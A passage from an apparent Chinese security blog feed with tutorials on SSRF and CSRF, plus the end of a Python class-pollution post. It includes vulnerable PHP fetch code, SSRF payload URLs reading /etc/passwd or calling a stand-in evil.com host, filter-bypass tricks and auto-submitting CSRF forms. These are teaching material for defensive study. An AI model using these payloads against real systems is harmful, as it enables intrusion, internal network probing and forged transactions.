dict</code>为<code>FALSE</code>，递归结束，此<code>时v=&quot;world&quot;</code>,不再是字典类型，然后执行语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure><p>重置<code>father类</code>中的<code>secret</code>属性的值为<code>world</code>，到此简单的链污染已经完成</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/2023/08/05/SSRF/"/>
      <url>/2023/08/05/SSRF/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="简单了解"><a href="#简单了解" class="headerlink" title="简单了解"></a>简单了解</h2><p>SSRF (Server-Side Request Forgery，服务器端请求伪造) 是一种由攻击者构造请求，由服务端发起请求的安全漏洞，一般情况下，SSRF攻击的目标是外网无法访问的内网系统，也正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔绝的内部系统。也就是说可以利用一个网络请求的服务，当作跳板进行攻击。</p><p>攻击者利用了可访问Web服务器（A）的特定功能 构造恶意payload；攻击者在访问A时，利用A的特定功能构造特殊payload，由A发起对内部网络中系统B（内网隔离，外部不可访问）的请求，从而获取敏感信息。此时A被作为中间人（跳板）进行利用。</p><p>SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤和限制。 例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF利用存在缺陷的WEB应用作为代理 攻击远程 和 本地的服务器。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><ul><li>攻击者可以通过公网访问到某个web服务器；</li><li>但是攻击者是无法通过公网访问到内网的其他设备或者办公区域；</li><li>这时候如果想进行内网探测，web服务器同时存在SSRF漏洞，就能以web服务器作为跳板，进而攻击其他服务器或区域。</li></ul><p><img src="/img/SSRF/ssrf.png" alt=""></p><h2 id="漏洞产生与危害"><a href="#漏洞产生与危害" class="headerlink" title="漏洞产生与危害"></a>漏洞产生与危害</h2><p>在PHP中的<code>curl()，file_get_contents()，fsockopen()</code>等函数是几个主要产生ssrf漏洞的函数</p><p><strong>file_get_contents()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//file_get_contents是把文件写入字符串，当把url是内网文件的时候，会先去把这个文件的内容读出来再写入，导致了文件读取</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$content</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="variable">$filename</span>=<span class="string">&#x27;./images/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.img&#x27;</span>;\</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$img</span>=<span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$img</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>fsockopen()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fsockopen()函数本身就是打开一个网络连接或者Unix套接字连接</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;<span class="subst">$host</span>&quot;</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>curl()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//利用方式很多最常见的是通过file、dict、gopher这三个协议来进行渗透，接下来也主要是集中讲对于curl()函数的利用方式</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); <span class="comment">//  初始化curl连接句柄</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); <span class="comment">//设置连接URL</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);  <span class="comment">// 不输出头文件的信息</span></span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);   <span class="comment">// 执行获取结果</span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);  <span class="comment">// 关闭curl连接句柄</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>); </span><br></pre></td></tr></table></figure><p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件</p><p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害</p><h2 id="漏洞攻击方式"><a href="#漏洞攻击方式" class="headerlink" title="漏洞攻击方式"></a>漏洞攻击方式</h2><ul><li>对外网，服务器所在内网，本地进行端口扫描（挨个试探），获取一些服务的banner信息</li><li>攻击运行在内网或本地的应用程序</li><li>对内网Web应用进行指纹识别，识别企业内部的资产信息，通过访问默认文件实现(如：readme文件)</li><li>攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如strust2,SQli等)</li><li>下载内网资源，利用file协议读取本地文件或资源等</li><li>内部任意主机的任意端口发送精心构造的Payload</li><li>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</li><li>进行跳板</li><li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li></ul><h1 id="可以利用的协议"><a href="#可以利用的协议" class="headerlink" title="可以利用的协议"></a>可以利用的协议</h1><p><strong>常用URL伪协议</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">/// 从文件系统中获取文件内容，如，file:///etc/passwd</span></span><br><span class="line">dict:<span class="comment">// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：</span></span><br><span class="line">sftp:<span class="comment">// SSH文件传输协议或安全文件传输协议</span></span><br><span class="line">ldap:<span class="comment">// 轻量级目录访问协议</span></span><br><span class="line">tftp:<span class="comment">// 简单文件传输协议</span></span><br><span class="line">gopher:<span class="comment">// 分布式文档传递服务，可使用gopherus生成payload</span></span><br></pre></td></tr></table></figure><h2 id="file"><a href="#file" class="headerlink" title="file"></a>file</h2><p>这种URL Schema可以尝试从文件系统中获取文件：</p><blockquote><p><code>http://example.com/ssrf.php?url=file:///etc/passwd</code></p><p><code>http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</code></p></blockquote><h2 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h2><p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表</p><blockquote><p><code>http://example.com/ssrf.php?dict://evil.com:1337/</code></p><p>evil.com:$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp/*]<br>accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</p></blockquote><h2 id="sftp"><a href="#sftp" class="headerlink" title="sftp"></a>sftp</h2><p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作</p><blockquote><p><code>http://example.com/ssrf.php?url=sftp://evil.com:1337/</code></p><p>evil.com:$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp/*]<br>accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</p></blockquote><h2 id="ldap-或ldaps-或ldapi"><a href="#ldap-或ldaps-或ldapi" class="headerlink" title="ldap://或ldaps:// 或ldapi://"></a>ldap://或ldaps:// 或ldapi://</h2><p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议</p><blockquote><p><code>http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit</code></p><p><code>http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit</code></p><p><code>http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</code></p></blockquote><h2 id="tftp"><a href="#tftp" class="headerlink" title="tftp://"></a>tftp://</h2><p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机</p><blockquote><p><code>http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</code></p><p>evil.com:# nc -lvup 1337<br>Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</p></blockquote><h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher://"></a>gopher://</h2><p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息</p><blockquote><p><a href="http://example.com/ssrf.php?url=http://attacker.com/gopher.php">http://example.com/ssrf.php?url=http://attacker.com/gopher.php</a> </p><p><code>gopher.php (host it on acttacker.com):-&lt;?php header(&#39;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#39;);?&gt;</code></p><p>evil.com:# nc -lvp 1337<br>Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</p></blockquote><h1 id="SSRF漏洞利用（危害）"><a href="#SSRF漏洞利用（危害）" class="headerlink" title="SSRF漏洞利用（危害）"></a>SSRF漏洞利用（危害）</h1><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p><p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p><p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p><p>5.利用file协议读取本地文件等。.</p><p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p><blockquote><p>http:192.168.64.144/phpmyadmin/<br>file:///D:/www.txt<br>dict://192.168.64.144:3306/info<br>ftp://192.168.64.144:21</p></blockquote><h1 id="SSRF绕过方式"><a href="#SSRF绕过方式" class="headerlink" title="SSRF绕过方式"></a>SSRF绕过方式</h1><h2 id="常见的绕过方式"><a href="#常见的绕过方式" class="headerlink" title="常见的绕过方式"></a>常见的绕过方式</h2><p><strong>限制为<code>http://www.xxx.com</code> 域名时（利用@）</strong></p><blockquote><p>可以尝试采用http基本身份认证的方式绕过<br>如：<code>http://www.aaa.com@www.bbb.com@www.ccc.com</code>，在对@解析域名中，不同的处理函数存在处理差异<br>在PHP的parse_url中会识别<code>www.ccc.com</code>，而libcurl则识别为<code>www.bbb.com</code>。</p></blockquote><p><strong>采用短网址绕过</strong></p><blockquote><p>比如百度短地址<code>https://dwz.cn/</code></p></blockquote><p><strong>采用进制转换</strong></p><blockquote><p>127.0.0.1</p><p>八进制：0177.0.0.1</p><p>十六进制：0x7f.0.0.1</p><p>十进制：2130706433.</p></blockquote><p><strong>利用特殊域名</strong></p><blockquote><p>原理是DNS解析。<strong>xip.io</strong>可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p></blockquote><p><strong>利用[::]</strong></p><blockquote><p>可以利用[::]来绕过localhost<br><code>http://127.0.0.1</code>&gt;&gt;<a href="http://[::127.0.0.1">http://[::127.0.0.1</a>]</p></blockquote><p><strong>利用句号</strong></p><blockquote><p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p></blockquote><p><strong>CRLF 编码绕过</strong></p><blockquote><p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a </span><br></pre></td></tr></table></figure><p><strong>利用封闭的字母数字</strong></p><blockquote><p>利用Enclosed alphanumerics<br>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com<br><code>http://127.0.0.1</code>&gt;&gt;&gt;<a href="http://[::①②⑦｡⓪｡⓪｡①">http://[::①②⑦｡⓪｡⓪｡①</a>]<br>List:<br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳<br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇<br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛<br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵<br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ<br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴<br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</p></blockquote><h2 id="常见限制"><a href="#常见限制" class="headerlink" title="常见限制"></a>常见限制</h2><p>限制为<code>http://www.xxx.com</code> 域名</p><blockquote><p>采用http基本身份认证的方式绕过，即@<br><code>http://www.xxx.com@www.xxc.com</code></p></blockquote><p>限制请求IP不为内网地址</p><blockquote><p>当不允许ip为内网地址时：<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p></blockquote><p>限制请求只为http协议</p><blockquote><p>（1）采取302跳转<br>（2）采取短地址</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF</title>
      <link href="/2023/08/05/CSRF/"/>
      <url>/2023/08/05/CSRF/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><blockquote><p> CSRF (Cross-site request forgery，跨站请求伪造)也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站</p></blockquote><p>简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器之前认证过，所以被访问的站点会觉得这是真正的用户操作而去运行</p><h1 id="CSRF攻击原理及过程"><a href="#CSRF攻击原理及过程" class="headerlink" title="CSRF攻击原理及过程"></a>CSRF攻击原理及过程</h1><p><img src="/img/CSRF/csrf.jpg" alt=""></p><p>1、Tom登录某银行网站，于是浏览器生成了Tom在该银行的的身份验证信息。</p><p>2、Jerry利用Sns.com服务器将伪造的转账请求包含在帖子中，并把帖子链接发给了Tom。</p><p>3、Tom在银行网站保持登录的情况下浏览帖子</p><p>4、这时Tom就在不知情的情况下将伪造的转账请求连同身份认证信息发送到银行网站。</p><p>5、银行网站看到身份认证信息，认为请求是Tom的合法操作</p><p>之后，银行网站会报据Tom的权限来处理Jerry所发起的恶意请求，这样Jerry就达到了伪造Tom的身份请求银行网站给自己转账的目的</p><p>在此过程中受害者Tom只需要做下面两件事情，攻击者Jerry就能够完成CSRF攻击：</p><ul><li>登录受信任银行网站，并生成身份验证信息；</li><li>在不登出银行网站(清除身份验证信息)的情况下，访问恶意站点Sns.com。</li></ul><p>很多情况下所谓的恶意站点，很有可能是一个存在其他漏洞(如XSS) 的受信任且被很多人访问的站点，这样，普通用户可能在不知不觉中便成为了受害者</p><p><strong>攻击条件：</strong></p><ul><li>登录受信任网站A，并在本地生成Cookie</li><li>在不登出A的情况下，访问危险网站B</li></ul><h1 id="CSRF攻击分类"><a href="#CSRF攻击分类" class="headerlink" title="CSRF攻击分类"></a>CSRF攻击分类</h1><p>CSRF漏洞一般分为站外和站内两种类型。</p><ul><li><p>CSRF站内类型的漏洞在一定程度上是由于程序员滥用<code>$_REQUEST</code>类变量造成的，一些敏感的操作本来是要求用户从表单提交发起POST请求传参给程序，但是由于使用了<code>$_REQUEST</code>等变量，程序也接收GET请求传参，这样就给攻击者使用CSRF攻击创造了条件，一般攻击者只要把预测好的请求参数放在站内一个贴子或者留言的图片链接里，受害者浏览了这样的页面就会被强迫发起请求</p></li><li><p>CSRF站外类型的漏洞其实就是传统意义上的外部提交数据问题，一般程序员会考虑给一些留言评论等的表单加上水印以防止SPAM问题，但是为了用户的体验性，一些操作可能没有做任何限制，所以攻击者可以先预测好请求的参数，在站外的Web页面里编写javascript脚本伪造文件请求或和自动提交的表单来实现GET、POST请求，用户在会话状态下点击链接访问站外的Web页面，客户端就被强迫发起请求</p></li></ul><h2 id="GET类型的CSRF"><a href="#GET类型的CSRF" class="headerlink" title="GET类型的CSRF"></a>GET类型的CSRF</h2><p><strong>仅仅须要一个HTTP请求。就能够构造一次简单的CSRF</strong></p><p>样例：</p><p>银行站点A：它以GET请求来完毕银行转账的操作，如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000 </span><br></pre></td></tr></table></figure><p>危险站点B：它里面有一段HTML的代码例如以下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://www.mybank.com/Transfer.php?toBankId</span>=<span class="string">11&amp;money</span>=<span class="string">1000</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>首先，你登录了银行站点A，然后访问危险站点B，噢，这时你会发现你的银行账户少了1000块</p><p>为什么会这样呢？</p><p><strong>原因是银行站点A违反了HTTP规范，使用GET请求更新资源</strong></p></li><li><p>在访问危险站点B的之前。你已经登录了银行站点A，而B中的 一个合法的请求，但这里被不法分子利用</p></li><li><p>所以你的浏览器会带上你的银行站点A的Cookie发出Get请求，去获取资源以GET的方式请求第三方资源（这里的第三方就是指银行站点了）</p></li></ul><p>原本这是：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</span><br></pre></td></tr></table></figure><p>结果银行站点服务器收到请求后，觉得这是一个更新资源操作（转账操作），所以就立马进行转账操作</p><h2 id="POST类型的CSRF"><a href="#POST类型的CSRF" class="headerlink" title="POST类型的CSRF"></a>POST类型的CSRF</h2><p>在CSRF攻击流行之初，曾经有一种错误的观点，认为CSRF攻击只能由GET请求发起。因此很多开发者都认为只要把重要的操作改成只允许POST请求，就能防止CSRF攻击</p><p>这样的错误观点形成的原因主要在于，大多数CSRF攻击发起时，使用的HTML标签都是<code>&lt;image&gt;、&lt;iframe&gt;、&lt;script&gt;</code>等带<code>src</code>属性的标签，这类标签只能够发起一次GET请求，而不能发起POST请求</p><p>而对于很多网站的应用来说，一些重要操作并未严格地区分GET与POST，攻击者可以使用GET来请求表单的提交地址。比如在PHP中，如果使用的是<code>$_REQUEST</code>，而非$_POST获取变量，则会存在这个问题</p><p>对于一个表单来说，用户往往也就可以使用GET方式提交参数。比如以下表单:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot; / register&quot;</span> <span class="attr">id</span>=<span class="string">&quot;register&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用户可尝试构造一个GET请求</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http: //host/register?username=test&amp;password=passwd</span><br></pre></td></tr></table></figure><p>来提交，若服务器端未对请求方法进行限制，则这个请求会通过</p><p>如果服务器端已经区分了GET与POST，那么攻击者有什么方法呢?对于攻击者来说，若干种方法可以构造出一个POST请求</p><p>最简单的方法，就是在一个页面中构造好一个表单表单，然后使用JavaScript自动提交这个表单。比如，攻击者在<code>www.b.com/test.html</code>中编写如下代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http: / / www . a.com/register&quot;</span> <span class="attr">id</span>=<span class="string">&quot;register&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>/&gt;</span>&lt;/ form&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> f = <span class="variable language_">document</span>.<span class="property">getElementById</span> ( <span class="string">&quot;register&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">f.<span class="property">inputs</span> [<span class="number">0</span>].<span class="property">value</span> = <span class="string">&quot;test&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">f.<span class="property">inputs</span> [<span class="number">1</span>].<span class="property">value</span> = <span class="string">&quot;passwd&quot;</span> ;</span></span><br><span class="line"><span class="language-javascript">f.<span class="property">submit</span> ();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>攻击者甚至可以将这个页面隐藏在一个不可见的<code>iframe</code>窗口中，那么整个自动提交表单的过程，对于用户来说也是不可见的</p><h1 id="CSRF漏洞检测"><a href="#CSRF漏洞检测" class="headerlink" title="CSRF漏洞检测"></a>CSRF漏洞检测</h1><p>检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Refexex字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞</p><p>随着对CSRF漏洞研究的不断深入，不断涌现出一些专[门针对CSRF漏洞进行检测的工具,如<code>CSRFTester</code>, <code>CSRF Request Builder</code>等</p><p>以<code>CSRFTester</code>工具为例，CSRF漏洞检测工具的测试原理如下：使用<code>CSRFTester</code>进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在<code>CSRFTester</code>中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2023/08/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2023/08/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
